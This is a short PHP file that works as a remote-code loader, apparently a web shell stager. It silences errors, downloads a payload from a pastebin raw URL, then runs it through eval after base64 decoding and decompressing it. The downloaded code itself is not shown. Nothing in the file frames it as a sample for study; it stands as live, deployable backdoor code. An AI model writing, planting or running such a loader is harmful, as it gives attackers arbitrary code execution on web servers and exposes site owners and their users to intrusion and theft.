<?php
@session_start();
@error_reporting(0); 
$cakilgans = file_get_contents('https://pastebin.com/raw/PT12uFSJ');
eval(gzinflate(base64_decode($cakilgans))); 
?>